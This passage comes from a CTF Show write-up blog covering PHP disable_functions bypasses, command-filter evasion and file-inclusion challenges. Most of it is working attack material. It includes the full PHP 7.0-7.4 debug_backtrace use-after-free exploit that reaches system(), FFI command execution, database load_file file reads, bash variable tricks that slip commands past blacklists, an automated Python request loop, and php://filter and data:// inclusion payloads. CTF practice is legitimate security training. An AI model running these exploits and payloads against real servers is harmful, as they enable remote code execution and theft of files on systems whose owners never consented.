$i)); &#125; write($abc, 0x20, $abc_addr + $fake_obj_offset); write($abc, 0xd0 + 0x38, 1, 4); write($abc, 0xd0 + 0x68, $zif_system); ($helper-&gt;b)($cmd); exit();&#125;ctfshow(&quot;cat /flag0.txt&quot;);ob_end_flush(); 1&lt;?php# PHP 7.0-7.4 disable_functions bypass PoC (*nix only)## Bug: https://bugs.php.net/bug.php?id=76047# debug_backtrace() returns a reference to a variable # that has been destroyed, causing a UAF vulnerability.## This exploit should work on all PHP 7.0-7.4 versions# released as of 30/01/2020.## Author: https://github.com/mm0r1pwn(&quot;uname -a&quot;);function pwn($cmd) &#123; global $abc, $helper, $backtrace; class Vuln &#123; public $a; public function __destruct() &#123; global $backtrace; unset($this-&gt;a); $backtrace = (new Exception)-&gt;getTrace(); # ;) if(!isset($backtrace[1][&#x27;args&#x27;])) &#123; # PHP &gt;= 7.4 $backtrace = debug_backtrace(); &#125; &#125; &#125; class Helper &#123; public $a, $b, $c, $d; &#125; function str2ptr(&amp;$str, $p = 0, $s = 8) &#123; $address = 0; for($j = $s-1; $j &gt;= 0; $j--) &#123; $address &lt;&lt;= 8; $address |= ord($str[$p+$j]); &#125; return $address; &#125; function ptr2str($ptr, $m = 8) &#123; $out = &quot;&quot;; for ($i=0; $i &lt; $m; $i++) &#123; $out .= chr($ptr &amp; 0xff); $ptr &gt;&gt;= 8; &#125; return $out; &#125; function write(&amp;$str, $p, $v, $n = 8) &#123; $i = 0; for($i = 0; $i &lt; $n; $i++) &#123; $str[$p + $i] = chr($v &amp; 0xff); $v &gt;&gt;= 8; &#125; &#125; function leak($addr, $p = 0, $s = 8) &#123; global $abc, $helper; write($abc, 0x68, $addr + $p - 0x10); $leak = strlen($helper-&gt;a); if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125; return $leak; &#125; function parse_elf($base) &#123; $e_type = leak($base, 0x10, 2); $e_phoff = leak($base, 0x20); $e_phentsize = leak($base, 0x36, 2); $e_phnum = leak($base, 0x38, 2); for($i = 0; $i &lt; $e_phnum; $i++) &#123; $header = $base + $e_phoff + $i * $e_phentsize; $p_type = leak($header, 0, 4); $p_flags = leak($header, 4, 4); $p_vaddr = leak($header, 0x10); $p_memsz = leak($header, 0x28); if($p_type == 1 &amp;&amp; $p_flags == 6) &#123; # PT_LOAD, PF_Read_Write # handle pie $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr; $data_size = $p_memsz; &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123; # PT_LOAD, PF_Read_exec $text_size = $p_memsz; &#125; &#125; if(!$data_addr || !$text_size || !$data_size) return false; return [$data_addr, $text_size, $data_size]; &#125; function get_basic_funcs($base, $elf) &#123; list($data_addr, $text_size, $data_size) = $elf; for($i = 0; $i &lt; $data_size / 8; $i++) &#123; $leak = leak($data_addr, $i * 8); if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123; $deref = leak($leak); # &#x27;constant&#x27; constant check if($deref != 0x746e6174736e6f63) continue; &#125; else continue; $leak = leak($data_addr, ($i + 4) * 8); if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123; $deref = leak($leak); # &#x27;bin2hex&#x27; constant check if($deref != 0x786568326e6962) continue; &#125; else continue; return $data_addr + $i * 8; &#125; &#125; function get_binary_base($binary_leak) &#123; $base = 0; $start = $binary_leak &amp; 0xfffffffffffff000; for($i = 0; $i &lt; 0x1000; $i++) &#123; $addr = $start - 0x1000 * $i; $leak = leak($addr, 0, 7); if($leak == 0x10102464c457f) &#123; # ELF header return $addr; &#125; &#125; &#125; function get_system($basic_funcs) &#123; $addr = $basic_funcs; do &#123; $f_entry = leak($addr); $f_name = leak($f_entry, 0, 6); if($f_name == 0x6d6574737973) &#123; # system return leak($addr + 8); &#125; $addr += 0x20; &#125; while($f_entry != 0); return false; &#125; function trigger_uaf($arg) &#123; # str_shuffle prevents opcache string interning $arg = str_shuffle(str_repeat(&#x27;A&#x27;, 79)); $vuln = new Vuln(); $vuln-&gt;a = $arg; &#125; if(stristr(PHP_OS, &#x27;WIN&#x27;)) &#123; die(&#x27;This PoC is for *nix systems only.&#x27;); &#125; $n_alloc = 10; # increase this value if UAF fails $contiguous = []; for($i = 0; $i &lt; $n_alloc; $i++) $contiguous[] = str_shuffle(str_repeat(&#x27;A&#x27;, 79)); trigger_uaf(&#x27;x&#x27;); $abc = $backtrace[1][&#x27;args&#x27;][0]; $helper = new Helper; $helper-&gt;b = function ($x) &#123; &#125;; if(strlen($abc) == 79 || strlen($abc) == 0) &#123; die(&quot;UAF failed&quot;); &#125; # leaks $closure_handlers = str2ptr($abc, 0); $php_heap = str2ptr($abc, 0x58); $abc_addr = $php_heap - 0xc8; # fake value write($abc, 0x60, 2); write($abc, 0x70, 6); # fake reference write($abc, 0x10, $abc_addr + 0x60); write($abc, 0x18, 0xa); $closure_obj = str2ptr($abc, 0x20); $binary_leak = leak($closure_handlers, 8); if(!($base = get_binary_base($binary_leak))) &#123; die(&quot;Couldn&#x27;t determine binary base address&quot;); &#125; if(!($elf = parse_elf($base))) &#123; die(&quot;Couldn&#x27;t parse ELF header&quot;); &#125; if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123; die(&quot;Couldn&#x27;t get basic_functions address&quot;); &#125; if(!($zif_system = get_system($basic_funcs))) &#123; die(&quot;Couldn&#x27;t get zif_system address&quot;); &#125; # fake closure object $fake_obj_offset = 0xd0; for($i = 0; $i &lt; 0x110; $i += 8) &#123; write($abc, $fake_obj_offset + $i, leak($closure_obj, $i)); &#125; # pwn write($abc, 0x20, $abc_addr + $fake_obj_offset); write($abc, 0xd0 + 0x38, 1, 4); # internal func type write($abc, 0xd0 + 0x68, $zif_system); # internal func handler ($helper-&gt;b)($cmd); exit();&#125; https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php 1c=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo $f.&quot; &quot; ;&#125;exit(); 1 1.45 Web 73 — disable_functions — DirectoryIterator1c=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo $f.&quot; &quot; ;&#125;exit();# bin dev etc flagc.txt home lib media mnt opt proc root run sbin srv sys tmp usr var 1c=include(&#x27;/flagc.txt&#x27;);exit(); 1.46 Web 74 — disable_functions — DirectoryIterator1c=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo $f.&quot; &quot; ;&#125;exit();# bin dev etc flagx.txt home lib media mnt opt proc root run sbin srv sys tmp usr varc=include(&#x27;/flagx.txt&#x27;);exit(); 1.47 Web 75 — disable_functions — 数据库、SQL 语句1c=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo $f.&quot; &quot; ;&#125;exit();# bin dev etc flag36.txt home lib media mnt opt proc root run sbin srv sys tmp usr var SQL 语句绕过 1c=try &#123; $dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;, &#x27;root&#x27;); foreach ($dbh-&gt;query(&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;) as $row) &#123; echo ($row[0]) . &quot;|&quot;; &#125; $dbh = null;&#125; catch (PDOException $e) &#123; echo $e-&gt;getMessage(); exit(0);&#125;exit(0);# 即c=try &#123;$dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,&#x27;root&#x27;);foreach($dbh-&gt;query(&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;) as $row)&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e&gt;getMessage();exit(0);&#125;exit(0); 1.48 Web 76 — disable_functions — 数据库、SQL 语句1c=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo $f.&quot; &quot; ;&#125;exit();# bin dev etc flag36d.txt home lib media mnt opt proc root run sbin srv sys tmp usr var 1c=try &#123; $dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;, &#x27;root&#x27;); foreach ($dbh-&gt;query(&#x27;select load_file(&quot;/flag36d.txt&quot;)&#x27;) as $row) &#123; echo ($row[0]) . &quot;|&quot;; &#125; $dbh = null;&#125; catch (PDOException $e) &#123; echo $e-&gt;getMessage(); exit(0);&#125;exit(0);# 即c=try &#123;$dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,&#x27;root&#x27;);foreach($dbh-&gt;query(&#x27;select load_file(&quot;/flag36d.txt&quot;)&#x27;) as $row)&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e&gt;getMessage();exit(0);&#125;exit(0); 1.50 Web 77 — disable_functions — FFI 扩展命令FFI 扩展命令 参考 1# 版本 php7.4 扩展简介FFI 是在 PHP 7.4 版本中新加入的，此扩展允许在 PHP 代码中加载共享库(.DLL 或 .so)，调用 C 函数及访问 C 数据结构，简单的说就是允许在 PHP 中运行 C 代码，可以方便的调用C语言的各种库，但同时它的使用伴随着很大的风险 使用配置使用 FFI 首先要开启扩展，在 php.ini 中去掉 extension=ffi 前面的 ; 并且修改 ffi.enable=true 即可使用，在phpinfo() 中可以查看是否开启了此扩展 1# 示例&lt;?php $ffi = FFI::cdef(&quot;int system(const char *command);&quot;); $ffi-&gt;system(&quot;echo Hello World&gt;./ttmp&quot;); echo file_get_contents(&quot;./ttmp&quot;);?&gt; 命令执行 如果目标机器开启了这一扩展，我们就有了一种全新的命令执行方式，在 system 被禁用的情况下，则可使用 FFI 来进行命令执行，例如在题目中执行 /readflag 并获取 flag，同时它也可以加载自定义链接库 1# 命令执行&lt;?php $ffi = FFI::cdef(&quot;int system(const char *command);&quot;); $ffi-&gt;system(&quot;/readflag &gt; /tmp/123.txt&quot;);echo file_get_contents(&quot;/tmp/123&quot;); @unlink(&quot;/tmp/123&quot;);?&gt; 类似的方法在蚁剑的 bypass disable_function 中可自动调用，但受到目录权限和 open_basedir 的限制导致很多情况下并不起作用 1# payloadc=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo $f.&quot; &quot; ;&#125;exit();# bin boot dev etc flag36x.txt home lib lib64 media mnt opt proc readflag root run sbin srv sys tmp usr var 1c=$ffi = FFI::cdef( &quot;int system(const char *command);&quot;);$ffi-&gt;system(&quot;/readflag &gt; 1.txt&quot;);exit();# 即c=?&gt;&lt;?php $ffi = FFI::cdef(&quot;int system(const char *command);&quot;);$ffi-&gt;system(&quot;/readflag &gt;test.txt&quot;);exit();# 随后访问 test.txt 即可 1.51 Web 118 — Linux bush 内置变量 — ${PATH:A}${PWD:A}flag in flag.php 查看源代码 发现 抓包发现 是 POST 传参 code bush 内置变量 https://www.cnblogs.com/sparkdev/p/9934595.html#title_12 https://blog.51cto.com/allenh/1695810 1# 测试 root@kali:~# echo $&#123;PWD&#125;/rootroot@kali:~# echo $&#123;PWD:0:1&#125;/root@kali:~# echo $&#123;PWD:0:2&#125;/rroot@kali:~# echo $&#123;PWD:1:2&#125;roroot@kali:~/桌面# echo $&#123;PWD&#125;/root/桌面root@kali:~/桌面# echo $&#123;PWD:~0&#125;面root@kali:~/桌面# echo $&#123;PWD:~2&#125;/桌面root@kali:~/桌面# echo $&#123;PWD:~1&#125;桌面# 如果过滤掉了数字，可使用字母，字母都相当于 0root@kali:~/桌面# echo $&#123;PWD:~A&#125;面root@kali:~/桌面# echo $&#123;PWD:~C&#125;面root@kali:~/桌面# echo $&#123;PWD:~K&#125;面root@kali:/var/www/html# echo $&#123;PWD::2&#125;/vroot@kali:/var/www/html# echo $&#123;PWD::1&#125;/# 构造 nlroot@kali:~/桌面# cd /var/www/html/root@kali:/var/www/html# echo $&#123;PATH&#125;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binroot@kali:/var/www/html# echo $&#123;PATH:~A&#125;$&#123;PWD:~A&#125;nl 1# payload$&#123;PATH:~A&#125;$&#123;PWD:~A&#125; ???????? 1.52 Web 119 — Linux bush 内置变量 — 构造 /bin/过滤了 PATH 和 BASH 一些知识点 大写字母等同于0 不加#是变量的值，加了#是变量的值的长度 1$&#123;#PWD&#125;root@kali:/var/www/html# echo $&#123;PWD&#125;/var/www/htmlroot@kali:/var/www/html# echo $&#123;#PWD&#125;13 RANDOM此变量值，随机出现整数，范围为0-32767。不过，虽然说是随机，但并不是真正的随机，因为每次得到的随机数都一样。为此，在使用RANDOM变量前，请随意设定一个数字给RANDOM，当做随机数种子，这样才不会每次产生的随机数其顺序都一样。 因此光利用RANDOM这个函数理论上就可以得到数字1-5了，不过相对来说4和5的概率会更大。 SHLVL 是记录多个 Bash 进程实例嵌套深度的累加器 不理解也没关系，只要知道这个东西的默认值是1，而且如果不进行一些特殊的操作的话，永远都是1，所以这个可以帮助我们得到数字1。 1# 构造 /bin/base64 flag.php$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;?$&#123;USER:~$&#123;PHP_VERSION:~A&#125;:$&#123;PHP_VERSION:~A&#125;&#125; ????.???或$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?????$&#123;#RANDOM&#125; ????.???# 构造 /bin/cat flag.php这个是hint$&#123;HOME:$&#123;#HOSTNAME&#125;:$&#123;#SHLVL&#125;&#125; ====&gt; t$&#123;PWD:$&#123;Z&#125;:$&#123;#SHLVL&#125;&#125; ====&gt; /$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;??$&#123;HOME:$&#123;#HOSTNAME&#125;:$&#123;#SHLVL&#125;&#125; ????.??? 1# payloadcode=$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?????$&#123;#RANDOM&#125; ????.??? 抓包修改 多刷新几遍 由于 4 和 5不确定 1.53 Web 120 — Linux bush 内置变量 — 长度限制 &lt;=651&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_POST[&#x27;code&#x27;]))&#123; $code=$_POST[&#x27;code&#x27;]; if(!preg_match(&#x27;/\\x09|\\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\\/|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|\\!|\\=|\\^|\\*|\\x26|\\%|\\&lt;|\\&gt;|\\&#x27;|\\&quot;|\\`|\\||\\,/&#x27;, $code))&#123; if(strlen($code)&gt;65)&#123; echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.&#x27;you are so long , I dont like &#x27;.&#x27;&lt;/div&gt;&#x27;; &#125; else&#123; echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.system($code).&#x27;&lt;/div&gt;&#x27;; &#125; &#125; else&#123; echo &#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;; &#125;&#125;?&gt; 限制长度 &lt;=65 1# payloadcode=$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?????$&#123;#RANDOM&#125; ????.??? 1.54 Web 121 — Linux bush 内置变量 — 过滤 SHLVL1&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_POST[&#x27;code&#x27;]))&#123; $code=$_POST[&#x27;code&#x27;]; if(!preg_match(&#x27;/\\x09|\\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\\/|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|_|~|\\!|\\=|\\^|\\*|\\x26|\\%|\\&lt;|\\&gt;|\\&#x27;|\\&quot;|\\`|\\||\\,/&#x27;, $code))&#123; if(strlen($code)&gt;65)&#123; echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.&#x27;you are so long , I dont like &#x27;.&#x27;&lt;/div&gt;&#x27;; &#125; else&#123; echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.system($code).&#x27;&lt;/div&gt;&#x27;; &#125; &#125; else&#123; echo &#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;; &#125;&#125;?&gt; 1root@kali:/var/www/html# echo $&#123;##&#125;1root@kali:/var/www/html# echo $&#123;#?&#125;1root@kali:/var/www/html/learn# touch 1.txt root@kali:/var/www/html/learn# echo &#x27;1234567&#x27; &gt; 1.txtroot@kali:/var/www/html/learn# /bin/rev 1.1.txtroot@kali:/var/www/html/learn# /bin/rev 1.txt7654321# /bin/rev 将文件反读root@kali:/var/www/html/learn# echo $&#123;#IFS&#125;3root@kali:/var/www/html/learn# echo $&#123;PWD:$&#123;#IFS&#125;:$&#123;#?&#125;&#125;rroot@kali:/var/www/html/learn# echo $&#123;PWD&#125;/var/www/html/learnroot@kali:/var/www/html/learn# echo $&#123;PWD:3:1&#125;r 1# payload$&#123;PWD::$&#123;#?&#125;&#125;???$&#123;PWD::$&#123;#?&#125;&#125;$&#123;PWD:$&#123;#IFS&#125;:$&#123;#?&#125;&#125;?? ????.??? 1.55 Web 122 — Linux bush 内置变量 — 过滤 # PWD ( HOME替换 ) $? 获取上一条命令执行结束后的返回值，0代表成功，非0代表失败。而且这个返回值原来是可控的 1&quot;OS error code 1: Operation not permitted&quot;&quot;OS error code 2: No such file or directory&quot;&quot;OS error code 3: No such process&quot;&quot;OS error code 4: Interrupted system call&quot;&quot;OS error code 5: Input/output error&quot;&quot;OS error code 6: No such device or address&quot;&quot;OS error code 7: Argument list too long&quot;&quot;OS error code 8: Exec format error&quot;&quot;OS error code 9: Bad file descriptor&quot;&quot;OS error code 10: No child processes&quot;&quot;OS error code 11: Resource temporarily unavailable&quot;&quot;OS error code 12: Cannot allocate memory&quot;&quot;OS error code 13: Permission denied&quot;&quot;OS error code 14: Bad address&quot;&quot;OS error code 15: Block device required&quot;&quot;OS error code 16: Device or resource busy&quot;&quot;OS error code 17: File exists&quot;&quot;OS error code 18: Invalid cross-device link&quot;&quot;OS error code 19: No such device&quot;&quot;OS error code 20: Not a directory&quot;&quot;OS error code 21: Is a directory&quot;&quot;OS error code 22: Invalid argument&quot;&quot;OS error code 23: Too many open files in system&quot;&quot;OS error code 24: Too many open files&quot;&quot;OS error code 25: Inappropriate ioctl for device&quot;&quot;OS error code 26: Text file busy&quot;&quot;OS error code 27: File too large&quot;&quot;OS error code 28: No space left on device&quot;&quot;OS error code 29: Illegal seek&quot;&quot;OS error code 30: Read-only file system&quot;&quot;OS error code 31: Too many links&quot;&quot;OS error code 32: Broken pipe&quot;&quot;OS error code 33: Numerical argument out of domain&quot;&quot;OS error code 34: Numerical result out of range&quot;&quot;OS error code 35: Resource deadlock avoided&quot;&quot;OS error code 36: File name too long&quot;&quot;OS error code 37: No locks available&quot;&quot;OS error code 38: Function not implemented&quot;&quot;OS error code 39: Directory not empty&quot;&quot;OS error code 40: Too many levels of symbolic links&quot;&quot;OS error code 42: No message of desired type&quot;&quot;OS error code 43: Identifier removed&quot;&quot;OS error code 44: Channel number out of range&quot;&quot;OS error code 45: Level 2 not synchronized&quot;&quot;OS error code 46: Level 3 halted&quot;&quot;OS error code 47: Level 3 reset&quot;&quot;OS error code 48: Link number out of range&quot;&quot;OS error code 49: Protocol driver not attached&quot;&quot;OS error code 50: No CSI structure available&quot;&quot;OS error code 51: Level 2 halted&quot;&quot;OS error code 52: Invalid exchange&quot;&quot;OS error code 53: Invalid request descriptor&quot;&quot;OS error code 54: Exchange full&quot;&quot;OS error code 55: No anode&quot;&quot;OS error code 56: Invalid request code&quot;&quot;OS error code 57: Invalid slot&quot;&quot;OS error code 59: Bad font file format&quot;&quot;OS error code 60: Device not a stream&quot;&quot;OS error code 61: No data available&quot;&quot;OS error code 62: Timer expired&quot;&quot;OS error code 63: Out of streams resources&quot;&quot;OS error code 64: Machine is not on the network&quot;&quot;OS error code 65: Package not installed&quot;&quot;OS error code 66: Object is remote&quot;&quot;OS error code 67: Link has been severed&quot;&quot;OS error code 68: Advertise error&quot;&quot;OS error code 69: Srmount error&quot;&quot;OS error code 70: Communication error on send&quot;&quot;OS error code 71: Protocol error&quot;&quot;OS error code 72: Multihop attempted&quot;&quot;OS error code 73: RFS specific error&quot;&quot;OS error code 74: Bad message&quot;&quot;OS error code 75: Value too large for defined data type&quot;&quot;OS error code 76: Name not unique on network&quot;&quot;OS error code 77: File descriptor in bad state&quot;&quot;OS error code 78: Remote address changed&quot;&quot;OS error code 79: Can not access a needed shared library&quot;&quot;OS error code 80: Accessing a corrupted shared library&quot;&quot;OS error code 81: .lib section in a.out corrupted&quot;&quot;OS error code 82: Attempting to link in too many shared libraries&quot;&quot;OS error code 83: Cannot exec a shared library directly&quot;&quot;OS error code 84: Invalid or incomplete multibyte or wide character&quot;&quot;OS error code 85: Interrupted system call should be restarted&quot;&quot;OS error code 86: Streams pipe error&quot;&quot;OS error code 87: Too many users&quot;&quot;OS error code 88: Socket operation on non-socket&quot;&quot;OS error code 89: Destination address required&quot;&quot;OS error code 90: Message too long&quot;&quot;OS error code 91: Protocol wrong type for socket&quot;&quot;OS error code 92: Protocol not available&quot;&quot;OS error code 93: Protocol not supported&quot;&quot;OS error code 94: Socket type not supported&quot;&quot;OS error code 95: Operation not supported&quot;&quot;OS error code 96: Protocol family not supported&quot;&quot;OS error code 97: Address family not supported by protocol&quot;&quot;OS error code 98: Address already in use&quot;&quot;OS error code 99: Cannot assign requested address&quot;&quot;OS error code 100: Network is down&quot;&quot;OS error code 101: Network is unreachable&quot;&quot;OS error code 102: Network dropped connection on reset&quot;&quot;OS error code 103: Software caused connection abort&quot;&quot;OS error code 104: Connection reset by peer&quot;&quot;OS error code 105: No buffer space available&quot;&quot;OS error code 106: Transport endpoint is already connected&quot;&quot;OS error code 107: Transport endpoint is not connected&quot;&quot;OS error code 108: Cannot send after transport endpoint shutdown&quot;&quot;OS error code 109: Too many references: cannot splice&quot;&quot;OS error code 110: Connection timed out&quot;&quot;OS error code 111: Connection refused&quot;&quot;OS error code 112: Host is down&quot;&quot;OS error code 113: No route to host&quot;&quot;OS error code 114: Operation already in progress&quot;&quot;OS error code 115: Operation now in progress&quot;&quot;OS error code 116: Stale NFS file handle&quot;&quot;OS error code 117: Structure needs cleaning&quot;&quot;OS error code 118: Not a XENIX named type file&quot;&quot;OS error code 119: No XENIX semaphores available&quot;&quot;OS error code 120: Is a named type file&quot;&quot;OS error code 121: Remote I/O error&quot;&quot;OS error code 122: Disk quota exceeded&quot;&quot;OS error code 123: No medium found&quot;&quot;OS error code 124: Wrong medium type&quot;&quot;OS error code 125: Operation canceled&quot;&quot;OS error code 126: Required key not available&quot;&quot;OS error code 127: Key has expired&quot;&quot;OS error code 128: Key has been revoked&quot;&quot;OS error code 129: Key was rejected by service&quot;&quot;OS error code 130: Owner died&quot;&quot;OS error code 131: State not recoverable&quot;&quot;MySQL error code 132: Old database file&quot;&quot;MySQL error code 133: No record read before update&quot;&quot;MySQL error code 134: Record was already deleted (or record file crashed)&quot;&quot;MySQL error code 135: No more room in record file&quot;&quot;MySQL error code 136: No more room in index file&quot;&quot;MySQL error code 137: No more records (read after end of file)&quot;&quot;MySQL error code 138: Unsupported extension used for table&quot;&quot;MySQL error code 139: Too big row&quot;&quot;MySQL error code 140: Wrong create options&quot;&quot;MySQL error code 141: Duplicate unique key or constraint on write or update&quot;&quot;MySQL error code 142: Unknown character set used&quot;&quot;MySQL error code 143: Conflicting table definitions in sub-tables of MERGE table&quot;&quot;MySQL error code 144: Table is crashed and last repair failed&quot;&quot;MySQL error code 145: Table was marked as crashed and should be repaired&quot;&quot;MySQL error code 146: Lock timed out; Retry transaction&quot;&quot;MySQL error code 147: Lock table is full; Restart program with a larger locktable&quot;&quot;MySQL error code 148: Updates are not allowed under a read only transactions&quot;&quot;MySQL error code 149: Lock deadlock; Retry transaction&quot;&quot;MySQL error code 150: Foreign key constraint is incorrectly formed&quot;&quot;MySQL error code 151: Cannot add a child row&quot;&quot;MySQL error code 152: Cannot delete a parent row&quot; 1# payload&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.??? 多多刷新 可以脚本尝试 1import requestsurl = &#x27;http://dd95c86c-d3bc-4b4b-a9f1-6ad337b0fa51.challenge.ctf.show:8080/&#x27;data1 = &#123;&#x27;code&#x27;:r&#x27;&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.???&#x27;&#125;while True: res = requests.post(url,data = data1) if &quot;PD9waHA&quot; in res.text: print(res.text) break 1.56 Web 124 — base_convert | getallheaders1&lt;?phperror_reporting(0);//听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET[&#x27;c&#x27;]))&#123; show_source(__FILE__);&#125;else&#123; //例子 c=20-1 $content = $_GET[&#x27;c&#x27;]; if (strlen($content) &gt;= 80) &#123; die(&quot;太长了不会算&quot;); &#125; $blacklist = [&#x27; &#x27;, &#x27;\\t&#x27;, &#x27;\\r&#x27;, &#x27;\\n&#x27;,&#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $content)) &#123; die(&quot;请不要输入奇奇怪怪的字符&quot;); &#125; &#125; //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;base_convert&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27;, &#x27;dechex&#x27;, &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;]; preg_match_all(&#x27;/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/&#x27;, $content, $used_funcs); foreach ($used_funcs[0] as $func) &#123; if (!in_array($func, $whitelist)) &#123; die(&quot;请不要输入奇奇怪怪的函数&quot;); &#125; &#125; //帮你算出答案 eval(&#x27;echo &#x27;.$content.&#x27;;&#x27;);&#125; 1$content = $_GET[&#x27;c&#x27;];1. 长度限制2. 黑名单，白名单3. eval()命令执行 base_convert getallheaders **方法一：构造 _GET ** 1# payload?acos=system&amp;asin=ls /&amp;c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;acos&#125;($$pi&#123;asin&#125;)?acos=system&amp;asin=cat /flag&amp;c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;acos&#125;($$pi&#123;asin&#125;) 方法二：利用 getallheaders() 更改请求头信息 1a 然后抓包，写入 1:ls / 二、总结Web 29-36 eval() Web 37-39 include Web 40 无参函数 套娃 Web 41 没写 Web 42-52 “ &gt;/dev/null 2&gt;&amp;1” Web 53-54 system() Web 55 /bin/ Web 56-57 [a-z] [0-9] Web 58-124 php://filter/read=convert.base64-encode/resource=flag.php 中的 flag.php 不能使用通配符，改为 data://协议利用 参考博客 https://blog.csdn.net/rfrder/article/details/112862827 https://blog.csdn.net/rfrder/article/details/109772962 https://blog.csdn.net/njh18790816639/article/details/115580408 https://blog.csdn.net/rfrder/article/details/112862827","categories":[{"name":"CTF Show","slug":"CTF-Show","permalink":"https://xizhi-future.github.io/categories/CTF-Show/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/tags/CTF/"}],"author":"xizhi-future"},{"title":"CTF-Show-文件包含","slug":"CTF-Show-文件包含","date":"2021-10-01T11:12:49.000Z","updated":"2021-10-01T11:14:02.300Z","comments":true,"path":"2021/10/01/CTF-Show-文件包含/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/CTF-Show-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","excerpt":"CTF Show 文件包含篇。","text":"CTF Show 文件包含篇。 一、CTF Show — 文件包含1.1 Web 78 — 最简单的文件包含 — 各种伪协议 绕过1234567&lt;?php if(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; include($file);&#125;else&#123; highlight_file(__FILE__);&#125; 1234?file=php://filter/read=convert.base64-encode/resource=flag.php?file=data://text/plain,&lt;?php system(&#x27;cat flag.php&#x27;); 